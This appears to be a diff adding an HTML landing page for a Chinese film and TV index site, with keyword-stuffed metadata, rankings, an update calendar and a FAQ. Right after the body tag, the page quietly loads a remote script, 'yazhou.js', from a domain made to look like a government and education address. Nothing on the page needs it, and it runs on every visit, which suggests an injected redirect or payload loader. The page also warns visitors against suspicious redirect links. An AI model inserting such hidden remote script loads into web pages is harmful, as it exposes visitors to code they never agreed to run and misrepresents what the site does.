@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#0f2419">
+<title>开心影视 开心影视 | 一站式影视娱乐入口，电影电视剧综艺动漫随心看</title>
+<meta name="description" content="开心影视 开心影视（https://kaixinyingshi-app.github.io）是一个为影视观众搭建的一站式娱乐入口。这里把电影、电视剧、综艺、动漫、纪录片与短剧的更新动态集中在一处，按热播榜、类型、地区、年份和播放进度分类整理。无论是想追当季热剧、找一部周末看的电影，还是补一部完结多年的老番，都能通过站内索引快速定位。网站适配手机与电脑浏览，栏目持续更新，让每一次打开都少一点翻找、多一点好内容。">
+<meta name="keywords" content="开心影视,开心影视,kaixinyingshi,影视娱乐,在线观影,热播剧,高分电影,综艺节目,动漫番剧,短剧,电影排行榜,电视剧更新,国产剧,美剧韩剧,纪录片推荐">
+<meta name="author" content="开心影视 开心影视">
+<meta name="distribution" content="global">
+<meta name="rating" content="general">
+<meta name="coverage" content="worldwide">
+<meta name="language" content="zh-CN">
+<meta name="target" content="影视观众,追剧用户,电影爱好者">
+<meta name="url" content="https://kaixinyingshi-app.github.io">
+<link rel="canonical" href="https://kaixinyingshi-app.github.io">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:"Helvetica Neue","PingFang SC","Microsoft YaHei",Arial,sans-serif;
+  background:#f4f3ee;color:#22272e;line-height:1.72;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+/* ===== masthead 报头 ===== */
+.mast{background:#0f2419;color:#f4f3ee;padding:15px 0 0;border-bottom:4px solid #d9b25a}
+.mast-top{max-width:1180px;margin:0 auto;padding:0 22px 13px;display:flex;justify-content:space-between;align-items:center;font-size:11.5px;letter-spacing:.2em;color:#9fb5a9;border-bottom:1px solid rgba(255,255,255,.14);gap:14px;flex-wrap:wrap}
+.mast-top b{color:#d9b25a;font-weight:600}
+.brand{max-width:1180px;margin:0 auto;padding:26px 22px 18px;display:flex;align-items:baseline;gap:16px;flex-wrap:wrap}
+.brand h1{font-size:clamp(44px,9vw,96px);font-weight:900;letter-spacing:-.05em;line-height:.95}
+.brand h1 s{text-decoration:none;color:#d9b25a}
+.brand small{font-size:12px;letter-spacing:.36em;color:#9fb5a9;text-transform:uppercase}
+.lede{max-width:1180px;margin:0 auto;padding:0 22px 30px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:end}
+.lede p{font-size:16.5px;color:#cdd8d1;max-width:520px}
+.lede .issue{text-align:right;font-size:12px;letter-spacing:.18em;color:#d9b25a}
+/* nav */
+.nav{background:#fff;border-bottom:1px solid #ddd8cd;position:sticky;top:0;z-index:40}
+.nav-in{max-width:1180px;margin:0 auto;padding:0 22px;display:flex;gap:2px;overflow-x:auto}
+.nav-in a{
+  flex:none;padding:15px 16px;font-size:14.5px;font-weight:600;color:#4a5158;letter-spacing:.03em;
+  border-bottom:3px solid transparent;white-space:nowrap;transition:.2s;
+}
+.nav-in a:hover{color:#0f2419;border-bottom-color:#d9b25a;background:#faf9f5}
+/* sections */
+section{padding:68px 0}
+.sec-t{display:flex;align-items:baseline;gap:14px;margin-bottom:34px;border-bottom:2px solid #0f2419;padding-bottom:12px}
+.sec-t span{font-size:11.5px;letter-spacing:.3em;color:#8b8578;font-weight:700}
+.sec-t h2{font-size:clamp(24px,3.4vw,34px);font-weight:900;letter-spacing:-.01em}
+.sec-t em{font-style:normal;margin-left:auto;font-size:12.5px;color:#8b8578}
+/* feature 票根 */
+.feat{display:grid;grid-template-columns:1.08fr .92fr;gap:26px}
+.ticket{
+  background:#fff;border:1px solid #ddd8cd;border-radius:4px;overflow:hidden;position:relative;
+  box-shadow:0 18px 40px -28px rgba(15,36,25,.5);transition:.3s;
+}
+.ticket:hover{transform:translateY(-5px);box-shadow:0 26px 48px -26px rgba(15,36,25,.55)}
+.ticket-main{background:linear-gradient(150deg,#163a2c,#0f2419);color:#f4f3ee;padding:30px}
+.ticket-main h3{font-size:25px;font-weight:800;line-height:1.35}
+.ticket-main p{font-size:14px;color:#b9ccc2;margin-top:12px}
+.ticket-meta{display:flex;gap:22px;margin-top:20px;font-size:12px;color:#d9b25a;letter-spacing:.08em;flex-wrap:wrap}
+.ticket-list{padding:6px 0}
+.ticket-list li{list-style:none;padding:14px 24px;border-bottom:1px dashed #e2ddd2;display:flex;gap:14px;align-items:baseline}
+.ticket-list li:last-child{border-bottom:none}
+.ticket-list b{font-size:13px;color:#d9b25a;font-weight:700;min-width:40px}
+.ticket-list span{flex:1;font-size:15px;font-weight:600}
+.ticket-list i{font-style:normal;font-size:12px;color:#8b8578}
+/* type columns */
+.types{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.type{
+  background:#fff;border:1px solid #ddd8cd;padding:26px 24px;border-radius:4px;position:relative;
+  transition:.28s;
+}
+.type:hover{border-color:#0f2419;background:#0f2419;color:#f4f3ee}
+.type:hover p,.type:hover li{color:#cdd8d1}
+.type .n{font-size:34px;font-weight:900;color:#d9b25a;line-height:1}
+.type h3{font-size:20px;margin:10px 0 12px;font-weight:800}
+.type p{font-size:14px;color:#5b626a}
+.type ul{margin-top:14px;padding-left:18px;font-size:13.5px;color:#5b626a;display:grid;gap:5px}
+/* cards */
+.cards{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.card{border-radius:4px;overflow:hidden;background:#fff;border:1px solid #ddd8cd;transition:.28s}
+.card:hover{border-color:#d9b25a;transform:translateY(-4px)}
+.card-cap{aspect-ratio:4/5;background:var(--c,linear-gradient(160deg,#2c4a3c,#15281f));position:relative}
+.card-cap b{position:absolute;left:14px;top:14px;font-size:11.5px;background:#d9b25a;color:#15281f;padding:3px 9px;border-radius:3px;font-weight:700}
+.card-cap i{position:absolute;right:14px;bottom:12px;font-style:normal;font-size:22px;font-weight:900;color:#f4f3ee;text-shadow:0 2px 8px rgba(0,0,0,.5)}
+.card-body{padding:15px 16px}
+.card-body h4{font-size:16px;font-weight:800}
+.card-body p{font-size:13px;color:#7a8087;margin-top:6px}
+/* list 2col */
+.list2{display:grid;grid-template-columns:1fr 1fr;gap:26px}
+.rule{border-top:3px solid #0f2419;padding-top:18px}
+.rule h3{font-size:19px;margin-bottom:16px;font-weight:800;display:flex;justify-content:space-between;align-items:baseline}
+.rule h3 a{font-size:12.5px;font-weight:600;color:#8b8578}
+.rule ol{list-style:none;counter-reset:n}
+.rule li{counter-increment:n;padding:11px 0;border-bottom:1px solid #e6e2d8;display:flex;gap:12px;align-items:baseline}
+.rule li::before{content:counter(n);font-size:12px;font-weight:800;color:#d9b25a;min-width:20px}
+.rule li span{flex:1;font-size:14.5px;font-weight:600}
+.rule li em{font-style:normal;font-size:12.5px;color:#8b8578}
+/* steps */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid #ddd8cd;background:#fff}
+.step{padding:26px 22px;border-right:1px solid #e6e2d8;position:relative}
+.step:last-child{border-right:none}
+.step b{font-size:30px;font-weight:900;color:#d9b25a;display:block}
+.step h4{font-size:16.5px;margin:8px 0 7px;font-weight:800}
+.step p{font-size:13.5px;color:#5b626a}
+/* qa */
+.qa{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.q{
+  background:#fff;border-left:4px solid #d9b25a;padding:20px 22px;border-radius:0 4px 4px 0;
+}
+.q h4{font-size:15.5px;font-weight:800;margin-bottom:8px;color:#0f2419}
+.q p{font-size:14px;color:#5b626a}
+/* foot */
+footer{background:#0f2419;color:#cdd8d1;padding:56px 0 40px}
+.foot{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:34px}
+.foot h5{font-size:12.5px;letter-spacing:.2em;color:#d9b25a;margin-bottom:14px;font-weight:700}
+.foot ul{list-style:none;display:grid;gap:9px}
+.foot a{font-size:14px;color:#a7b7ad}
+.foot a:hover{color:#fff}
+.foot .addr{font-size:13px;color:#a7b7ad;margin-top:14px}
+.foot .addr b{display:block;color:#fff;font-size:14.5px;margin:6px 0;font-weight:700;word-break:break-all}
+.copy{margin-top:38px;padding-top:20px;border-top:1px solid rgba(255,255,255,.14);font-size:12.5px;color:#7d9186;display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap}
+/* mobile */
+@media(max-width:900px){
+  .feat,.list2,.foot,.lede{grid-template-columns:1fr;display:grid}
+  .lede .issue{text-align:left}
+  .types,.qa{grid-template-columns:repeat(2,1fr)}
+  .cards,.steps{grid-template-columns:repeat(2,1fr)}
+  .steps{overflow:hidden}
+  .step{border-right:none;border-bottom:1px solid #e6e2d8}
+}
+@media(max-width:540px){
+  section{padding:52px 0}.wrap{padding:0 16px}.nav-in{padding:0 16px}
+  .types,.qa,.cards,.steps{grid-template-columns:1fr}
+  .brand h1{letter-spacing:-.03em}
+  .ticket-main{padding:24px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="mast">
+  <div class="mast-top">
+    <span>开心影视 · 开心影视 &nbsp;|&nbsp; <b>KAIXIN YINGSHI</b></span>
+    <span>VOL.06 &nbsp; ISSUE.12 &nbsp;·&nbsp; 每日更新</span>
+  </div>
+  <div class="brand">
+    <h1>开心影视<s>·</s>开心影视</h1>
+    <small>一站式影视娱乐入口</small>
+  </div>
+  <div class="lede">
+    <p>把分散在各处的影视内容，整理成一份随时能翻开的清单。电影、剧集、综艺、动漫、纪录片与短剧，在这里共用同一套索引方式。</p>
+    <div class="issue">封面专题<br>今日值得看的六部作品</div>
+  </div>
+</div>
+
+<nav class="nav">
+  <div class="nav-in">
+    <a href="#hot">今日热榜</a>
+    <a href="#zone">娱乐专区</a>
+    <a href="#update">更新日历</a>
+    <a href="#path">找片路径</a>
+    <a href="#ask">访客问答</a>
+    <a href="#about">关于 开心影视</a>
+  </div>
+</nav>
+
+<section id="hot">
+  <div class="wrap">
+    <div class="sec-t"><span>FEATURE</span><h2>今日热榜 · 六部值得点开的作品</h2><em>06 / 12 更新</em></div>
+    <div class="feat">
+      <article class="ticket">
+        <div class="ticket-main">
+          <h3>周末不剧荒：六部作品承包你的休息日</h3>
+          <p>从院线新片到连载番剧，这六部是近期被反复点开的作品，类型覆盖动作、剧情、科幻、悬疑、动画与纪录。</p>
+          <div class="ticket-meta"><span>类型 · 6 部</span><span>时长 · 约 13 小时</span><span>更新 · 每日</span></div>
+        </div>
+        <ul class="ticket-list">
+          <li><b>01</b><span>破晓行动</span><i>动作 · 128 分钟</i></li>
+          <li><b>02</b><span>慢车向北</span><i>爱情 · 108 分钟</i></li>
+          <li><b>03</b><span>逆光航行</span><i>科幻 · 142 分钟</i></li>
+          <li><b>04</b><span>迷雾档案</span><i>悬疑 · 更新至 18 集</i></li>
+          <li><b>05</b><span>墨色江湖</span><i>动画 · 完结 12 集</i></li>
+          <li><b>06</b><span>蔚蓝之下</span><i>纪录 · 6 集全</i></li>
+        </ul>
+      </article>
+      <div>
+        <div class="cards">
+          <article class="card"><div class="card-cap" style="--c:linear-gradient(160deg,#4a3b2b,#241c12)"><b>电影</b><i>8.5</i></div><div class="card-body"><h4>破晓行动</h4><p>现代动作片，追逐与近身格斗段落密集。</p></div></article>
+          <article class="card"><div class="card-cap" style="--c:linear-gradient(160deg,#2b3f4a,#12202a)"><b>电影</b><i>8.6</i></div><div class="card-body"><h4>慢车向北</h4><p>双向奔赴的异地爱情，节奏舒缓克制。</p></div></article>
+          <article class="card"><div class="card-cap" style="--c:linear-gradient(160deg,#3a2b4a,#181024)"><b>剧集</b><i>8.9</i></div><div class="card-body"><h4>迷雾档案</h4><p>单元式悬疑剧，线索埋设细密。</p></div></article>
+          <article class="card"><div class="card-cap" style="--c:linear-gradient(160deg,#4a452b,#241f12)"><b>纪录</b><i>9.4</i></div><div class="card-body"><h4>蔚蓝之下</h4><p>自然类纪录片，深海生态与光影并存。</p></div></article>
+        </div>
+        <div style="margin-top:18px;background:#0f2419;color:#f4f3ee;padding:24px;border-radius:4px">
+          <div style="font-size:11.5px;letter-spacing:.3em;color:#d9b25a;font-weight:700">EDITOR'S NOTE</div>
+          <p style="font-size:15px;margin-top:10px;color:#d8e2dc">选片不看名气看完成度：一部片值不值得看，先看作者的表达是否完整，再看它有没有被过度讨论。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="zone" style="background:#efece4">
+  <div class="wrap">
+    <div class="sec-t"><span>SECTION</span><h2>六个娱乐专区，按心情挑入口</h2><em>全部栏目</em></div>
+    <div class="types">
+      <div class="type"><div class="n">01</div><h3>院线大片</h3><p>正在上映与刚下线的商业电影索引，动作、灾难、犯罪、剧情、传记、历史分列其中。</p><ul><li>近期上映片单</li><li>票房与口碑对照</li><li>同类影片延伸</li></ul></div>
+      <div class="type"><div class="n">02</div><h3>剧集剧场</h3><p>国产剧、美剧、韩剧与台剧的更新进度汇总，标注已更集数与完结状态。</p><ul><li>当季热播</li><li>完结补剧</li><li>经典老剧</li></ul></div>
+      <div class="type"><div class="n">03</div><h3>动漫番剧</h3><p>日漫、国创与剧场版动画的作品档案，区分连载中与已完结作品。</p><ul><li>新番时间表</li><li>剧场版动画</li><li>亲子向动画</li></ul></div>
+      <div class="type"><div class="n">04</div><h3>综艺直播</h3><p>真人秀、访谈、竞演与生活类综艺的档期整理，含往季节目归档。</p><ul><li>最新一期索引</li><li>常驻嘉宾阵容</li><li>往季节目合集</li></ul></div>
+      <div class="type"><div class="n">05</div><h3>纪录观察</h3><p>自然、美食、人文、科技与社会观察类纪录片的高分长片与系列剧集。</p><ul><li>自然生态</li><li>人文历史</li><li>科技前沿</li></ul></div>
+      <div class="type"><div class="n">06</div><h3>短剧单元</h3><p>竖屏短剧与微剧的单集时长较短，适合碎片时间连续观看。</p><ul><li>古装爱情</li><li>都市职场</li><li>悬疑反转</li></ul></div>
+    </div>
+  </div>
+</section>
+
+<section id="update">
+  <div class="wrap">
+    <div class="sec-t"><span>SCHEDULE</span><h2>更新日历 · 别错过新的一集</h2><em>每周滚动</em></div>
+    <div class="list2">
+      <div class="rule">
+        <h3>正在连载 <a href="#">全部 →</a></h3>
+        <ol>
+          <li><span>迷雾档案</span><em>更新至 18 集 · 每周三、周六</em></li>
+          <li><span>长安十二楼</span><em>更新至 32 集 · 每日 20:00</em></li>
+          <li><span>墨色江湖</span><em>已完结 12 集 · 可一口气补完</em></li>
+          <li><span>逆光航行 前传</span><em>更新至 06 集 · 每周日</em></li>
+          <li><span>周末营业中 第二季</span><em>更新至 09 集 · 每周五</em></li>
+        </ol>
+      </div>
+      <div class="rule">
+        <h3>本周上新 <a href="#">全部 →</a></h3>
+        <ol>
+          <li><span>破晓行动</span><em>院线新片 · 动作</em></li>
+          <li><span>蔚蓝之下 第四集</span><em>纪录片 · 自然生态</em></li>
+          <li><span>舌尖四季 完结篇</span><em>纪录片 · 美食人文</em></li>
+          <li><span>逆流之光</span><em>电影 · 科幻冒险</em></li>
+          <li><span>边境线 第二季</span><em>剧集 · 谍战悬疑</em></li>
+        </ol>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="path" style="background:#efece4">
+  <div class="wrap">
+    <div class="sec-t"><span>METHOD</span><h2>四步找片路径，少走弯路</h2><em>找片指南</em></div>
+    <div class="steps">
+      <div class="step"><b>1</b><h4>想看什么情绪</h4><p>先确定是想要刺激、放松、感动还是思考，再决定选动作、喜剧、爱情还是纪录。</p></div>
+      <div class="step"><b>2</b><h4>定时长与档期</h4><p>通勤时段选短剧或综艺单期，周末再安排电影或连载剧集。</p></div>
+      <div class="step"><b>3</b><h4>看评分与标签</h4><p>评分只作参考，重点看类型标签和剧情简介是否契合自己的口味。</p></div>
+      <div class="step"><b>4</b><h4>加入观看清单</h4><p>把候选作品加入清单，下次打开直接续看，不用重新搜索。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="ask">
+  <div class="wrap">
+    <div class="sec-t"><span>Q&amp;A</span><h2>访客问答 · 关于 开心影视 开心影视</h2><em>常见问题</em></div>
+    <div class="qa">
+      <div class="q"><h4>开心影视 开心影视主要提供什么？</h4><p>一个影视内容索引与观看线索整理入口，覆盖电影、电视剧、综艺、动漫、纪录片与短剧六类内容。</p></div>
+      <div class="q"><h4>内容多久更新一次？</h4><p>热播剧集每日同步更新进度，电影与纪录片片单每周补充，节假日前后会加密更新。</p></div>
+      <div class="q"><h4>手机上能正常浏览吗？</h4><p>整个站点采用响应式布局，手机、平板与电脑均可正常浏览全部栏目，无需单独下载客户端。</p></div>
+      <div class="q"><h4>如何找到某一年的老片？</h4><p>使用筛选条件按年份回溯，也可在搜索框输入片名加出品年份，同名影片会附加年份区分。</p></div>
+      <div class="q"><h4>想推荐的片子怎么提交？</h4><p>通过页面底部的联系入口提交片名与出品年份，编辑团队会在后续更新中优先补充。</p></div>
+      <div class="q"><h4>清晰度怎么选？</h4><p>详情页会标注可用清晰度与文件大小建议，依据当前网络环境自行选择清晰度档位即可。</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="about" style="background:#0f2419;color:#f4f3ee">
+  <div class="wrap">
+    <div class="sec-t" style="border-color:#d9b25a"><span style="color:#d9b25a">ABOUT</span><h2 style="color:#f4f3ee">关于 开心影视 开心影视</h2><em style="color:#9fb5a9">站点说明</em></div>
+    <div class="list2">
+      <div>
+        <p style="font-size:16px;color:#d8e2dc">开心影视 开心影视把影视观众的找片成本降到最低。我们不追求把片名堆得越多越好，而是希望每一份片单都经过分类与核验，让打开网站的人能在几分钟内做出选择。</p>
+        <p style="font-size:16px;color:#d8e2dc;margin-top:14px">栏目按观看目的切分：想看新片去院线大片，想追进度去剧集剧场，碎片时间交给综艺与短剧，安静时段留给纪录片。</p>
+      </div>
+      <div style="background:#163a2c;padding:24px;border-radius:4px">
+        <div style="font-size:11.5px;letter-spacing:.3em;color:#d9b25a;font-weight:700">OFFICIAL ADDRESS</div>
+        <p style="font-size:14px;margin-top:10px;color:#b9ccc2">本站唯一官方网址</p>
+        <p style="font-size:20px;font-weight:800;color:#fff;margin-top:6px;word-break:break-all">https://kaixinyingshi-app.github.io</p>
+        <p style="font-size:13px;margin-top:14px;color:#9fb5a9">请勿轻信私信、评论区或弹窗中的跳转链接，也不要向任何第三方页面提交个人信息。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot">
+      <div>
+        <div class="brand" style="padding:0"><h1 style="font-size:38px;color:#fff">开心影视<s style="color:#d9b25a">·</s>开心影视</h1></div>
+        <p class="addr">开心影视 开心影视 · 一站式影视娱乐入口，专注影视内容索引与观看线索整理。<br><b>https://kaixinyingshi-app.github.io</b></p>
+      </div>
+      <div><h5>内容</h5><ul><li><a href="#">电影</a></li><li><a href="#">电视剧</a></li><li><a href="#">动漫</a></li><li><a href="#">纪录片</a></li></ul></div>
+      <div><h5>栏目</h5><ul><li><a href="#hot">今日热榜</a></li><li><a href="#zone">娱乐专区</a></li><li><a href="#update">更新日历</a></li><li><a href="#ask">访客问答</a></li></ul></div>
+      <div><h5>关于</h5><ul><li><a href="#about">关于本站</a></li><li><a href="#">合作联系</a></li><li><a href="#">意见反馈</a></li><li><a href="#">免责声明</a></li></ul></div>
+    </div>
+    <div class="copy"><span>© <span id="yr">2026</span> 开心影视 开心影视 · 本站内容仅供影视信息检索与观看线索整理使用</span><span>官方网址：https://kaixinyingshi-app.github.io</span></div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var t=document.querySelector(this.getAttribute('href'));
+    if(t){e.preventDefault();window.scrollTo({top:t.getBoundingClientRect().top+window.pageYOffset-58,behavior:'smooth'});}
+  });
+});
+</script>
+</body>
+</html>
